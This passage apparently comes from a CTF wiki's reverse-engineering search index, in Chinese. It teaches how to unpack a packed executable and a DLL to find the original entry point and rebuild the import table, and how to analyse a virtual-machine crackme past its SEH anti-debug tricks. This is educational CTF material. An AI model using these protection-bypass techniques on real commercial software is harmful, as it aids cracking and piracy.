\u4e4b\u540e\u4f1a\u9047\u5230\u591a\u4e2a\u8df3\u8f6c\uff0c\u6211\u4eec\u5c3d\u91cf\u6ee1\u8db3\u5411\u4e0b\u7684\u8df3\u8f6c\uff0c\u5bf9\u4e8e\u5411\u4e0a\u7684\u8df3\u8f6c\u4e0d\u4e88\u5b9e\u73b0\u5e76\u5229\u7528F4\u8df3\u51fa\u5faa\u73af\uff0c\u76f4\u5230 0040D3AF \u5904, \u6211\u4eec\u770b\u4ee5\u4e0b\u7684\u4ee3\u7801 0040 D3AF 61 popad 0040 D3B0 75 08 jnz short NotePad.0040D3BA 0040 D3B2 B8 01000000 mov eax , 0x1 0040 D3B7 C2 0 C00 retn 0xC 0040 D3BA 68 CC104000 push NotePad.004010CC 0040 D3BF C3 retn \u8fd9\u91cc popad \u53ef\u4ee5\u6062\u590d\u5728\u7a0b\u5e8f\u5165\u53e3\u70b9\u5904\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u72b6\u6001, \u7136\u540e jnz \u8df3\u8f6c\u5230 0040D3BA \u5904, \u8fd9\u91cc\u662f\u5229\u7528 push \u548c retn \u6765\u5c06 EIP \u6539\u53d8\u4e3a 004010CC , \u4e5f\u5c31\u662f\u8bf4\u5728\u58f3\u89e3\u538b\u5b8c\u4ee3\u7801\u7b49\u8d44\u6e90\u5b8c\u6bd5\u540e, \u5c06\u901a\u8fc7 jnz \u8df3\u8f6c\u5230 push \u5904, \u7136\u540e\u901a\u8fc7 push \u548c ret \u5c06 EIP \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u539f\u6765\u7684\u5165\u53e3\u70b9(OEP)\u5e76\u8fd4\u56de\u5230OEP\u5904, \u7136\u540e\u7ee7\u7eed\u6267\u884c\u539f\u7a0b\u5e8f\u7684\u4ee3\u7801. \u6211\u4eec\u6267\u884c\u5230 retn \u8fd4\u56de\u540e, \u53ef\u4ee5\u770b\u5230\u5982\u4e0b: \u663e\u7136, \u6211\u4eec\u5230\u4e86\u4e00\u5806\u88ab Ollydbg \u8bef\u8ba4\u4e3a\u662f\u6570\u636e\u7684\u5730\u65b9\u7ee7\u7eed\u6267\u884c, \u663e\u7136 Ollydbg \u5206\u6790\u9519\u8bef\u4e86, \u6211\u4eec\u9700\u8981\u8ba9 Ollydbg \u91cd\u65b0\u5206\u6790, \u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u9009\u62e9 \u5206\u6790->\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 , \u6216\u662f\u6309\u4e0b ctrl+a , \u8fd9\u65f6\u6b63\u786e\u5730\u663e\u793a\u51faOEP\u5904\u7684\u6c47\u7f16\u6307\u4ee4.","title":"\u5355\u6b65\u8ddf\u8e2a\u6cd5"},{"location":"reverse/unpack/trace/#_1","text":"\u6253\u5f00\u7a0b\u5e8f\u6309F8\u5355\u6b65\u5411\u4e0b, \u5c3d\u91cf\u5b9e\u73b0\u5411\u4e0b\u7684jmp\u8df3\u8f6c \u4f1a\u7ecf\u5e38\u9047\u5230\u5927\u7684\u5faa\u73af, \u8fd9\u65f6\u8981\u591a\u7528 F4 \u6765\u8df3\u8fc7\u5faa\u73af \u5982\u679c\u51fd\u6570\u8f7d\u5165\u65f6\u4e0d\u8fdc\u5904\u5c31\u662f\u4e00\u4e2acall(\u8fd1call), \u90a3\u4e48\u6211\u4eec\u5c3d\u91cf\u4e0d\u8981\u76f4\u63a5\u8df3\u8fc7, \u800c\u662f\u8fdb\u5165\u8fd9\u4e2acall \u4e00\u822c\u8df3\u8f6c\u5e45\u5ea6\u5927\u7684jmp\u6307\u4ee4, \u90fd\u6781\u6709\u53ef\u80fd\u662f\u8df3\u8f6c\u5230\u4e86\u539f\u7a0b\u5e8f\u5165\u53e3\u70b9(OEP)","title":"\u8981\u70b9"},{"location":"reverse/unpack/trace/#_2","text":"\u793a\u4f8b\u7a0b\u5e8f\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: 1_trace.zip \u5355\u6b65\u8ddf\u8e2a\u6cd5\u5176\u5b9e\u5c31\u662f\u4e00\u6b65\u4e00\u6b65\u5c3d\u91cf\u4ece\u7a0b\u5e8f\u5165\u53e3\u70b9\u5f80\u4e0b\u8d70, \u5728\u5355\u6b65\u7684\u8fc7\u7a0b\u4e2d\u6ce8\u610fEIP\u4e0d\u8981\u8dd1\u504f\u4e86, \u4f46\u662f\u5bf9\u4e8e\u4e00\u4e9b\u6bd4\u8f83\u590d\u6742\u7684\u58f3\u800c\u8a00, \u5355\u6b65\u7684\u8fc7\u7a0b\u4f1a\u663e\u5f97\u5f02\u5e38\u67af\u71e5\u800c\u4e14\u5bb9\u6613\u628a\u81ea\u5df1\u7ed5\u6655. \u6240\u4ee5\u5355\u6b65\u8ddf\u8e2a\u4e5f\u5e38\u7528\u4e8e\u5206\u6790\u4e00\u4e9b\u5173\u952e\u4ee3\u7801\u90e8\u5206(\u8ddf\u9759\u6001\u5206\u6790\u76f8\u7ed3\u5408), \u800c\u4e0d\u662f\u5b8c\u5168\u5730\u4ece\u5934\u5206\u6790\u5230\u5c3e, \u8fd9\u6709\u8fdd\u9006\u5411\u5de5\u7a0b\u7684\u7406\u5ff5. \u7528Ollydbg\u6253\u5f00\u538b\u7f29\u5305\u5185\u7684Notepad.exe, \u505c\u5728\u4e86\u4e0b\u56fe\u4f4d\u7f6e. \u5165\u53e3\u70b9\u662f\u4e00\u4e2a pushad \u4fdd\u5b58\u6240\u6709\u5bc4\u5b58\u5668\u72b6\u6001\u5230\u6808\u4e2d, \u968f\u540e\u4fbf\u662f\u4e00\u4e2a call \u8c03\u7528\u4f4d\u4e8e 0040D00A \u5904\u7684\u51fd\u6570. \u8c03\u7528\u540e\u4fbf\u65e0\u6761\u4ef6\u8df3\u8f6c\u5230 459DD4F7 \u5904, \u4e4b\u540e\u7684 push ebp \u548c retn \u663e\u7136\u6ca1\u6709\u4efb\u4f55\u610f\u4e49. \u50cf\u8fd9\u79cd\u5165\u53e3\u70b9\u9644\u8fd1\u5c31\u662f\u4e00\u4e2a call \u7684\u6211\u4eec\u79f0\u4e3a \u8fd1call , \u5bf9\u4e8e\u8fd1call\u6211\u4eec\u9009\u62e9\u6b65\u8fdb, \u6309\u4e0bF7(\u5f53\u7136\u4f60\u4e5f\u53ea\u80fd\u9009\u62e9\u6b65\u8fdb, \u4e0d\u7136EIP\u5c31\u8dd1\u504f\u7a0b\u5e8f\u505c\u6b62\u4e86). \u6b65\u8fdb\u540e\u53c8\u662f\u4e00\u4e2a call , \u6211\u4eec\u7ee7\u7eed\u6b65\u8fdb, \u6309F7, \u8ddf\u8fdb\u540e\u53d1\u73b0\u6ca1\u6709\u8fd1call\u4e86, \u6211\u4eec\u53ef\u4ee5\u770b\u5230\u7a0b\u5e8f\u5728\u8c03 GetModuleHandleA , GetProcAddress \u7b49API, \u7ee7\u7eed\u5411\u4e0b\u5206\u6790. \u4e4b\u540e\u4f1a\u9047\u5230\u591a\u4e2a\u8df3\u8f6c\uff0c\u6211\u4eec\u5c3d\u91cf\u6ee1\u8db3\u5411\u4e0b\u7684\u8df3\u8f6c\uff0c\u5bf9\u4e8e\u5411\u4e0a\u7684\u8df3\u8f6c\u4e0d\u4e88\u5b9e\u73b0\u5e76\u5229\u7528F4\u8df3\u51fa\u5faa\u73af\uff0c\u76f4\u5230 0040D3AF \u5904, \u6211\u4eec\u770b\u4ee5\u4e0b\u7684\u4ee3\u7801 0040 D3AF 61 popad 0040 D3B0 75 08 jnz short NotePad.0040D3BA 0040 D3B2 B8 01000000 mov eax , 0x1 0040 D3B7 C2 0 C00 retn 0xC 0040 D3BA 68 CC104000 push NotePad.004010CC 0040 D3BF C3 retn \u8fd9\u91cc popad \u53ef\u4ee5\u6062\u590d\u5728\u7a0b\u5e8f\u5165\u53e3\u70b9\u5904\u4fdd\u5b58\u7684\u5bc4\u5b58\u5668\u72b6\u6001, \u7136\u540e jnz \u8df3\u8f6c\u5230 0040D3BA \u5904, \u8fd9\u91cc\u662f\u5229\u7528 push \u548c retn \u6765\u5c06 EIP \u6539\u53d8\u4e3a 004010CC , \u4e5f\u5c31\u662f\u8bf4\u5728\u58f3\u89e3\u538b\u5b8c\u4ee3\u7801\u7b49\u8d44\u6e90\u5b8c\u6bd5\u540e, \u5c06\u901a\u8fc7 jnz \u8df3\u8f6c\u5230 push \u5904, \u7136\u540e\u901a\u8fc7 push \u548c ret \u5c06 EIP \u8bbe\u7f6e\u4e3a\u7a0b\u5e8f\u539f\u6765\u7684\u5165\u53e3\u70b9(OEP)\u5e76\u8fd4\u56de\u5230OEP\u5904, \u7136\u540e\u7ee7\u7eed\u6267\u884c\u539f\u7a0b\u5e8f\u7684\u4ee3\u7801. \u6211\u4eec\u6267\u884c\u5230 retn \u8fd4\u56de\u540e, \u53ef\u4ee5\u770b\u5230\u5982\u4e0b: \u663e\u7136, \u6211\u4eec\u5230\u4e86\u4e00\u5806\u88ab Ollydbg \u8bef\u8ba4\u4e3a\u662f\u6570\u636e\u7684\u5730\u65b9\u7ee7\u7eed\u6267\u884c, \u663e\u7136 Ollydbg \u5206\u6790\u9519\u8bef\u4e86, \u6211\u4eec\u9700\u8981\u8ba9 Ollydbg \u91cd\u65b0\u5206\u6790, \u6211\u4eec\u53ef\u4ee5\u53f3\u952e\u9009\u62e9 \u5206\u6790->\u4ece\u6a21\u5757\u4e2d\u5220\u9664\u5206\u6790 , \u6216\u662f\u6309\u4e0b ctrl+a , \u8fd9\u65f6\u6b63\u786e\u5730\u663e\u793a\u51faOEP\u5904\u7684\u6c47\u7f16\u6307\u4ee4.","title":"\u793a\u4f8b"},{"location":"reverse/unpack/unpack-dll/","text":"\u8fd9\u91cc\u9700\u8981\u8054\u7cfb\u4e0a\u7bc7\u7684 \u624b\u52a8\u67e5\u627eIAT\u5e76\u4f7f\u7528ImportREC\u91cd\u5efa \u4f8b\u9898\u6587\u4ef6\u4f60\u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: unpack_dll.zip \u56e0\u4e3a Dll \u8131\u58f3\u9700\u8981\u8fd9\u4e00\u6b65\u9aa4. Dll \u8131\u58f3\u7684\u6700\u5173\u952e\u7684\u6b65\u9aa4\u5728\u4e8e \u4f7f\u7528LordPE\u4fee\u6539\u5176Dll\u7684\u6807\u5fd7 , \u7528 LordPE \u6253\u5f00 UnpackMe.dll , \u7136\u540e\u5728\u7279\u5f81\u503c\u90a3\u91cc\u70b9\u51fb ... , \u7136\u540e\u53d6\u6d88\u52fe\u9009 DLL \u6807\u5fd7, \u4fdd\u5b58\u540e, \u7cfb\u7edf\u5c31\u4f1a\u5c06\u8be5\u6587\u4ef6\u89c6\u4f5c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6. \u6211\u4eec\u5c06 UnpackMe.dll \u540e\u7f00\u540d\u6539\u6210 UnpackMe.exe , \u7136\u540e\u7528OD\u8f7d\u5165. \u4e00\u822c\u5728\u5165\u53e3\u70b9, \u7a0b\u5e8f\u90fd\u4f1a\u4fdd\u5b58\u4e00\u4e9b\u4fe1\u606f, \u8fd9\u91cc\u5c31\u5f88\u7b80\u5355, \u53ea\u4f5c\u4e86\u4e00\u4e2a cmp . \u8981\u6ce8\u610f\u7684\u4e00\u70b9\u662f, \u8fd9\u91cc\u7684 jnz \u8df3\u8f6c\u76f4\u63a5\u5c31\u8df3\u5230\u4e86 unpacking \u8fc7\u7a0b\u7684\u672b\u5c3e. \u56e0\u6b64\u6211\u4eec\u9700\u8981\u4fee\u6539\u5bc4\u5b58\u5668\u7684 z \u6807\u5fd7\u6765\u4f7f\u5f97\u8df3\u8f6c\u5931\u6548. \u540c\u65f6\u5728 unpacking \u8fc7\u7a0b\u7684\u672b\u5c3e\u8bbe\u4e0b\u4e00\u4e2a\u65ad\u70b9\u4ee5\u907f\u514d\u8131\u58f3\u5b8c\u7136\u540e\u76f4\u63a5\u8fd0\u884c.(\u7a0b\u5e8f\u4f1a\u65ad\u5728\u8fd9\u4e2a\u65ad\u70b9\u4e0a, \u4f46\u662f\u8131\u58f3\u5df2\u7ecf\u5b8c\u6210, \u4ee3\u7801\u90fd\u5f88\u6e05\u6670) Dll \u8131\u58f3\u7684\u57fa\u672c\u6b65\u9aa4\u8ddf exe \u6587\u4ef6\u8131\u58f3\u4e00\u6837, \u800c\u5728\u91cd\u5efa IAT \u65f6, \u9700\u8981\u7167\u7740\u4e0a\u7bc7 \u624b\u52a8\u67e5\u627eIAT\u5e76\u4f7f\u7528ImportREC\u91cd\u5efa \u6240\u8bf4\u7684\u90a3\u6837, \u624b\u52a8\u627e\u5230 IAT \u8868\u5e76\u7528 ImportREC \u8fdb\u884c\u91cd\u5efa. \u53ea\u662f\u8981\u6ce8\u610f, \u5728\u8131\u58f3\u5b8cdump\u540e, \u8981\u8bb0\u5f97\u7528LordPE\u628a DLL \u6807\u5fd7\u6062\u590d\u8fc7\u6765\u5e76\u5c06\u6587\u4ef6\u540e\u7f00\u540d\u6539\u4e3a .dll .","title":"DLL \u6587\u4ef6\u8131\u58f3"},{"location":"reverse/vm/vm/","text":"\u865a\u62df\u673a\u5206\u6790 \u00b6 \u6709\u5173\u865a\u62df\u673a\u5206\u6790\u90e8\u5206, \u6211\u4eec\u4ee5\u4e00\u9053\u7b80\u5355\u7684crackme\u6765\u8fdb\u884c\u8bb2\u89e3. \u5bf9\u5e94\u7684 crackme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.exe \u5bf9\u5e94\u7684 keygenme \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: fuelvm_keygen.py \u5bf9\u5e94\u7684 IDA\u6570\u636e\u5e93 \u53ef\u4ee5\u70b9\u51fb\u6b64\u5904\u4e0b\u8f7d: FuelVM.idb \u672c\u9898\u4f5c\u8005\u8bbe\u8ba1\u4e86\u4e00\u4e2a\u5177\u6709\u591a\u79cd\u6307\u4ee4\u7684\u7b80\u5355\u865a\u62df\u673a. \u6211\u4eec\u4f7f\u7528IDA\u6765\u8fdb\u884c\u5206\u6790. \u5e76\u4e3a\u4e86\u65b9\u4fbf\u8bb2\u89e3, \u6211\u5bf9\u53cd\u6c47\u7f16\u51fa\u7684\u4e00\u4e9b\u53d8\u91cf\u91cd\u65b0\u8fdb\u884c\u4e86\u547d\u540d. \u8fd0\u884c\u7a0b\u5e8f \u00b6 \u6211\u4eec\u8fd0\u884c\u7a0b\u5e8f FuelVM.exe. \u754c\u9762\u5982\u4e0b\u6240\u793a \u5728\u8fd9\u4e2a\u754c\u9762\u4e2d, \u6211\u4eec\u770b\u5230\u53f3\u4e24\u4e2a\u8f93\u5165\u6846, \u4e00\u4e2a\u7528\u4e8e\u8f93\u5165\u7528\u6237\u540dName, \u53e6\u4e00\u4e2a\u5219\u7528\u4e8e\u8f93\u5165\u5bc6\u94a5Key. \u8fd8\u6709\u4e24\u4e2a\u6309\u94ae, Go\u7528\u4e8e\u63d0\u4ea4\u8f93\u5165, \u800cExit\u5219\u7528\u4e8e\u9000\u51fa\u7a0b\u5e8f. \u83b7\u53d6\u7528\u6237\u8f93\u5165 \u00b6 \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u4ece\u8fd9\u91cc\u5165\u624b. \u7a0b\u5e8f\u60f3\u83b7\u53d6\u7528\u6237\u8f93\u5165, \u9700\u8981\u8c03\u7528\u7684\u4e00\u4e2aAPI\u662f GetDlgItemTextA() UINT GetDlgItemTextA ( HWND hDlg , int nIDDlgItem , LPSTR lpString , int cchMax ); \u83b7\u53d6\u7684\u8f93\u5165\u5b57\u7b26\u4e32\u4f1a\u4fdd\u5b58\u5728 lpString \u91cc. \u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u6253\u5f00IDA\u67e5\u627e\u6709\u4ea4\u53c9\u5f15\u7528 GetDlgItemTextA() \u7684\u5730\u65b9. .text: 00401142 push 0 Ch ; cchMax .text : 00401144 push offset inputName ; lpString .text : 00401149 push 3 F8h ; nIDDlgItem .text : 0040114 E push [ ebp + hWnd ] ; hDlg .text : 00401151 call GetDlgItemTextA .text: 00401156 push 0 Ch ; cchMax .text : 00401158 push offset inputKey ; lpString .text : 0040115 D push 3 F9h ; nIDDlgItem .text : 00401162 push [ ebp + hWnd ] ; hDlg .text : 00401165 call GetDlgItemTextA .text: 0040116 A mov var_a , 0 .text: 00401171 call process_input .text: 00401176 jmp short locExit \u5982\u4e0a, IDA\u53ea\u6709\u8fd9\u91cc\u8c03\u7528\u8fc7 GetDlgItemTextA \u5e76\u4e14\u8c03\u7528\u4e86\u4e24\u6b21\u5206\u522b\u83b7\u53d6 inputName \u548c inputKey . \u968f\u540e\u521d\u59cb\u5316\u4e86\u4e00\u4e2a\u53d8\u91cf\u4e3a0, \u56e0\u4e3a\u8fd8\u4e0d\u660e\u767d\u8fd9\u4e2a\u53d8\u91cf\u7684\u4f5c\u7528, \u56e0\u6b64\u5148\u91cd\u547d\u540d\u4e3a var_a . \u4e4b\u540e\u8fdb\u884c\u4e86\u4e00\u6b21\u51fd\u6570\u8c03\u7528\u5e76jmp\u8df3\u8f6c. \u56e0\u4e3ajmp\u8df3\u8f6c\u4f4d\u7f6e\u7684\u4ee3\u7801\u662f\u4e00\u4e9b\u9000\u51fa\u7a0b\u5e8f\u7684\u4ee3\u7801, \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u65ad\u5b9a\u4e0a\u9762\u7684\u8fd9\u4e2acall, \u662f\u5728\u8c03\u7528\u5904\u7406\u7528\u6237\u8f93\u5165\u7684\u51fd\u6570. \u56e0\u6b64\u5c06jmp\u7684\u4f4d\u7f6e\u91cd\u547d\u540d\u4e3a locExit , \u51fd\u6570\u5219\u91cd\u547d\u540d\u4e3a process_input . \u5904\u7406\u7528\u6237\u8f93\u5165 \u00b6 \u6211\u4eec\u8fdb\u5165 process_input \u51fd\u6570, \u8be5\u51fd\u6570\u4ec5\u4ec5\u5bf9\u8f93\u5165\u5b57\u7b26\u4e32\u8fdb\u884c\u4e86\u5f88\u7b80\u5355\u7684\u5904\u7406. result = strlength (( int ) inputName ); if ( v1 >= 7 ) // v1 = length of inputName { * ( _DWORD * ) & lenOfName = v1 ; result = strlength (( int ) inputKey ); if ( v2 >= 7 ) // v2 = length of inputKey { i = 0 ; do { inputName [ i ] ^= i ; ++ i ; } while ( i <= * ( _DWORD * ) & lenOfName ); unk_4031CE = i ; dword_4031C8 = dword_4035FF ; initVM (); initVM (); __debugbreak (); JUMPOUT ( * ( _DWORD * ) & word_4012CE ); } } return result ; \u9996\u5148\u662f\u8fd9\u4e2a strlength() \u51fd\u6570. \u51fd\u6570\u4f7f\u7528 cld; repne scasb; not ecx; dec ecx \u6765\u8ba1\u7b97\u5b57\u7b26\u4e32\u957f\u5ea6\u5e76\u5c06\u7ed3\u679c\u4fdd\u5b58\u5728 ecx \u91cc. \u662f\u6c47\u7f16\u57fa\u7840\u77e5\u8bc6\u5c31\u4e0d\u591a\u4ecb\u7ecd. \u6240\u4ee5\u6211\u4eec\u5c06\u8be5\u51fd\u6570\u91cd\u547d\u540d\u4e3a strlength .text: 004011 C2 arg_0 = dword ptr 8 .text: 004011 C2 .text: 004011 C2 push ebp .text: 004011 C3 mov ebp , esp .text: 004011 C5 mov edi , [ ebp + arg_0 ] .text: 004011 C8 sub ecx , ecx .text: 004011 CA sub al , al .text: 004011 CC not ecx .text: 004011 CE cld .text: 004011 CF repne scasb .text: 004011 D1 not ecx .text: 004011 D3 dec ecx .text: 004011 D4 leave .text: 004011 D5 retn 4 .text: 004011 D5 strlength endp \u800c\u5728IDA\u751f\u6210\u7684\u4f2aC\u4ee3\u7801\u5904\u6709 v1 \u548c v2 , \u6211\u5bf9\u5176\u8fdb\u884c\u4e86\u6ce8\u89e3, \u53ef\u4ee5\u770b\u6c47\u7f16, \u91cc\u9762\u662f\u4f7f\u7528 ecx \u4e0e 7 \u8fdb\u884c\u6bd4\u8f83, \u800c ecx \u662f\u5b57\u7b26\u4e32\u7684\u957f\u5ea6, \u4e8e\u662f\u6211\u4eec\u53ef\u4ee5\u77e5\u9053, \u8fd9\u91cc\u5bf9\u8f93\u5165\u7684\u8981\u6c42\u662f: inputName \u548c inputKey \u7684\u957f\u5ea6\u5747\u4e0d\u5c11\u4e8e 7 \u5f53 inputName \u548c inputKey \u957f\u5ea6\u5747\u4e0d\u5c11\u4e8e7\u65f6, \u90a3\u4e48\u5c31\u53ef\u4ee5\u5bf9\u8f93\u5165\u8fdb\u884c\u7b80\u5355\u7684\u53d8\u6362. \u4ee5\u4e0b\u662f\u4e00\u4e2a\u5faa\u73af i = 0 ; do { inputName [ i ] ^= i ; ++ i ; } while ( i <= * ( _DWORD * ) & lenOfName ); \u5bf9\u5e94\u7684python\u4ee3\u7801\u5373 def obfuscate ( username ): s = \"\" for i in range ( len ( username )): s += chr ( ord ( username [ i ]) ^ i ) return s \u51fd\u6570\u4e4b\u540e\u5bf9\u4e00\u4e9b\u53d8\u91cf\u8fdb\u884c\u4e86\u8d4b\u503c(\u8fd9\u4e9b\u5e76\u4e0d\u91cd\u8981, \u5c31\u5ffd\u7565\u4e0d\u8bb2\u4e86.) \u6ce8\u518cSEH \u00b6 .text: 004012 B5 push offset seh_handler .text: 004012 BA push large dword ptr fs : 0 .text: 004012 C1 mov large fs : 0 , esp .text: 004012 C8 call initVM .text: 004012 CD int 3 ; Trap to Debugger initVM \u5b8c\u6210\u7684\u662f\u4e00\u4e9b\u865a\u62df\u673a\u542f\u52a8\u524d\u7684\u521d\u59cb\u5316\u5de5\u4f5c(\u5176\u5b9e\u5c31\u662f\u5bf9\u4e00\u4e9b\u5bc4\u5b58\u5668\u548c\u76f8\u5173\u7684\u90e8\u5206\u8d4b\u521d\u503c), \u6211\u4eec\u4e4b\u540e\u6765\u8ba8\u8bba. \u8fd9\u91cc\u6211\u4eec\u5173\u6ce8\u7684\u662fSEH\u90e8\u5206. \u8fd9\u91cc\u6ce8\u518c\u4e86\u4e00\u4e2aSEH\u53e5\u67c4, \u5f02\u5e38\u5904\u7406\u51fd\u6570\u6211\u91cd\u547d\u540d\u4e3a seh_handler , \u5e76\u4e4b\u540e\u4f7f\u7528 int 3 \u624b\u52a8\u89e6\u53d1\u5f02\u5e38. \u800c\u5728 seh_handler \u4f4d\u7f6e, IDA\u5e76\u672a\u6b63\u786e\u8bc6\u522b\u51fa\u5bf9\u5e94\u7684\u4ee3\u7801 .text:004012D7 seh_handler db 64h ; DATA XREF: process_input+7D\u0018o .text:004012D8 dd 58Fh, 0C4830000h, 13066804h, 0FF640040h, 35h, 25896400h .text:004012D8 dd 0 .text:004012F4 dd 1B8h, 0F7C93300h, 0F7C033F1h, 0FFC483E1h, 8F64FDEBh .text:004012F4 dd 5, 4C48300h, 40133068h, 35FF6400h, 0 .text:0040131C dd 258964h, 33000000h, 33198BC9h, 83E1F7C0h, 0FDEBFFC4h .text:0040131C dd 58F64h, 83000000h, 5E6804C4h, 64004013h, 35FFh, 89640000h .text:0040131C dd 25h, 0C033CC00h, 0C483E1F7h, 83FDEBFFh, 4035FF05h, 0D8B0200h .text:0040131C dd 4035FFh, 3000B1FFh, 58F0040h, 4031C8h, 31C83D80h, 750A0040h .text:0040131C dd 0B1FF4176h, 403000h, 31C8058Fh, 3D800040h, 4031C8h \u6211\u4eec\u53ef\u4ee5\u70b9\u51fb\u76f8\u5e94\u4f4d\u7f6e\u6309\u4e0b c \u952e, \u5c06\u8fd9\u4e9b\u6570\u636e\u8f6c\u6362\u6210\u4ee3\u7801\u8fdb\u884c\u8bc6\u522b. (\u6211\u4eec\u9700\u8981\u6309\u4e0b\u591a\u6b21c\u952e\u8fdb\u884c\u8f6c\u6362), \u5f97\u5230\u5982\u4e0b\u4ee3\u7801. \u5982\u4e0b, \u5728 seh_handler \u4f4d\u7f6e, \u53c8\u7528\u7c7b\u4f3c\u7684\u65b9\u6cd5\u6ce8\u518c\u4e86\u4e00\u4e2a\u4f4d\u4e8e 401306h \u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570, \u5e76\u901a\u8fc7 xor ecx,ecx; div ecx \u624b\u52a8\u89e6\u53d1\u4e86\u4e00\u4e2a \u96640\u5f02\u5e38 . \u800c\u5728 loc_401301 \u4f4d\u7f6e, \u8fd9\u662f\u4e00\u4e2a\u53cd\u8c03\u8bd5\u6280\u5de7, jmp loc_401301+2 \u4f1a\u4f7f\u5f97 EIP \u8f6c\u5411\u4e00\u6761\u6307\u4ee4\u4e2d\u95f4, \u4f7f\u5f97\u65e0\u6cd5\u7ee7\u7eed\u8c03\u8bd5. \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06 00401301~00401306 \u90e8\u5206\u7684\u4ee3\u7801 nop \u6389, \u7136\u540e\u5728 00401306 \u4f4d\u7f6e\u521b\u5efa\u4e00\u4e2a\u65b0\u51fd\u6570 seh_handler2 seh_handler: ; DATA XREF: process_input+7D\u0018o .text:004012D7 pop large dword ptr fs:0 .text:004012DE add esp, 4 .text:004012E1 push 401306h .text:004012E6 push large dword ptr fs:0 .text:004012ED mov large fs:0, esp .text:004012F4 mov eax, 1 .text:004012F9 xor ecx, ecx .text:004012FB div ecx .text:004012FD xor eax, eax .text:004012FF mul ecx .text:00401301 .text:00401301 loc_401301: ; CODE XREF: .text:00401304\u0019j .text:00401301 add esp, 0FFFFFFFFh .text:00401304 jmp short near ptr loc_401301+2 .text:00401306 ; --------------------------------------------------------------------------- .text:00401306 pop large dword ptr fs:0 .text:0040130D add esp, 4 .text:00401310 push 401330h .text:00401315 push large dword ptr fs:0 .text:0040131C mov large fs:0, esp .text:00401323 xor ecx, ecx .text:00401325 mov ebx, [ecx] .text:00401327 xor eax, eax .text:00401329 mul ecx \u7c7b\u4f3c\u7684, \u8fd8\u6709 401330h \u91cd\u547d\u540d\u4e3a seh_handler3 , \u800c 40135Eh \u662f\u6700\u540e\u4e00\u4e2a\u6ce8\u518c\u7684\u5f02\u5e38\u5904\u7406\u51fd\u6570, \u6211\u4eec\u53ef\u4ee5\u63a8\u6d4b\u8fd9\u624d\u662f\u865a\u62df\u673a\u771f\u6b63\u7684main\u51fd\u6570, \u56e0\u6b64\u6211\u4eec\u5c06 40135Eh \u91cd\u547d\u540d\u4e3a vm_main . (\u6709\u5173SEH\u548c\u53cd\u8c03\u8bd5\u7684\u90e8\u5206, \u53ef\u4ee5\u63a8\u8350\u5927\u5bb6\u81ea\u5df1\u53bb\u52a8\u6001\u8c03\u8bd5\u4e00\u756a\u5f04\u6e05\u695a) \u6062\u590d\u5806\u6808\u5e73\u8861 \u00b6 \u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a vm_main \u51fd\u6570(\u91cd\u547d\u540d\u540e\u8fd8\u9700\u8981\u521b\u5efa\u51fd\u6570, IDA\u624d\u80fd\u8bc6\u522b), \u7136\u540e\u6309\u4e0b F5 \u63d0\u793a\u5931\u8d25, \u5931\u8d25\u7684\u539f\u56e0\u5219\u662f\u7531\u4e8e\u5806\u6808\u4e0d\u5e73\u8861\u5bfc\u81f4\u7684. \u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u70b9\u51fbIDA\u83dc\u5355\u9879 Options->General \u5728\u53f3\u4fa7\u52fe\u9009 stack pointer . \u8fd9\u6837\u5c31\u4f1a\u663e\u793a\u51fa\u5bf9\u5e94\u7684\u6808\u6307\u9488. .text:004017F2 000 jmp vm_main .text:004017F7 ; --------------------------------------------------------------------------- .text:004017F7 000 push 0 ; uType .text:004017F9 004 push offset aError ; \"Error\" .text:004017FE 008 push offset Text ; \"The key is wrong.\" .text:00401803 00C push 0 ; hWnd .text:00401805 010 call MessageBoxA .text:0040180A .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 leave .text:0040180B -04 leave .text:0040180C -08 leave .text:0040180D -0C leave .text:0040180E -10 leave .text:0040180F -14 leave .text:00401810 -18 leave .text:00401811 -1C retn .text:00401811 vm_main endp ; sp-analysis failed \u6211\u4eec\u6765\u5230\u6700\u4e0b\u663e\u793a\u4e0d\u5e73\u8861\u7684\u4f4d\u7f6e. \u6700\u4e0a\u7684 jmp vm_main \u8868\u660e\u865a\u62df\u673a\u5185\u5728\u6267\u884c\u4e00\u4e2a\u5faa\u73af. \u800c MessageBoxA \u7684\u8c03\u7528\u5219\u662f\u663e\u793a\u6700\u540e\u5f39\u51fa\u7684\u9519\u8bef\u4fe1\u606f. \u800c\u5728 locret_40180A \u4f4d\u7f6e\u5904, \u7ecf\u8fc7\u591a\u6b21leave\u5806\u6808\u4e25\u91cd\u4e0d\u5e73\u8861, \u56e0\u6b64\u6211\u4eec\u9700\u8981\u624b\u52a8\u6062\u590d\u5806\u6808\u5e73\u8861. \u8fd9\u91cc\u4e5f\u5f88\u7b80\u5355, \u5728 0040180A \u4f4d\u7f6e\u5df2\u7ecf\u5806\u6808\u5e73\u8861\u4e86(000), \u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u5c06\u8fd9\u4e00\u53e5 leave \u4fee\u6539\u4e3a retn \u5c31\u53ef\u4ee5\u4e86. \u5982\u4e0b\u8fd9\u6837 .text:0040180A locret_40180A: ; CODE XREF: vm_main+492\u0018j .text:0040180A 000 retn .text:0040180B ; --------------------------------------------------------------------------- .text:0040180B 004 leave .text:0040180C 004 leave .text:0040180D 004 leave \u7136\u540e\u4f60\u5c31\u53ef\u4ee5\u53d1\u73b0 vm_main \u53ef\u4ee5F5\u751f\u6210\u4f2aC\u4ee3\u7801\u4e86. \u865a\u62df\u673a\u6307\u4ee4\u5206\u6790 \u00b6 